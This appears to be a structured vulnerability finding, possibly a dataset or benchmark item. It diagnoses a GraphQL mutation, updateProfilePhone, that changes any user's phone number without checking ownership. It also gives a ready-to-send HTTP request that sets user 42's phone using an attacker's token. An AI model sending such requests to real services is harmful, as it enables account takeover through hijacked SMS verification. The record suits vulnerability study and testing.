diagnosis: The GraphQL mutation accepts user_id as an explicit argument and updates the corresponding profile record without ensuring user_id equals info.context['user'].id. Any authenticated user can modify phone numbers on arbitrary user profiles, enabling account takeover via SMS verification hijack.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"query": "mutation { updateProfilePhone(userId: 42, phone: \"+1555019999\") { success message } }"}
